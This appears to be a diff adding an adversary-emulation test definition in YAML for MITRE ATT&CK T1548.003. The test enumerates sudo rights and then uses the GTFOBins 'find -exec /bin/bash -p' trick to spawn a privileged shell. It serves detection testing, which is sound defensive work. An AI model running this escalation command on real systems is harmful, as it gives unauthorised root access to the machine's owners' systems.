@@ -1,0 +1,23 @@
+name: Sudo Privilege Escalation via GTFOBin - Shell Spawn
+description: |
+  Simulates an adversary abusing sudo permissions to escalate privileges by spawning a
+  privileged shell through a GTFOBins-listed binary. This test first enumerates sudo
+  permissions (sudo -l), then attempts to spawn a shell via a common GTFOBin (find).
+  This maps to MITRE ATT&CK T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching.
+  Reference: https://attack.mitre.org/techniques/T1548/003/
+  Reference: https://gtfobins.github.io/gtfobins/find/#sudo
+supported_platforms:
+  - linux
+input_arguments:
+  gtfobin_binary:
+    description: GTFOBin binary to use for shell spawn via sudo (must be in sudoers)
+    type: path
+    default: /usr/bin/find
+executor:
+  name: bash
+  elevation_required: true
+  command: |
+    sudo -l
+    sudo #{gtfobin_binary} . -exec /bin/bash -p \; -quit
+  cleanup_command: |
+    exit 0
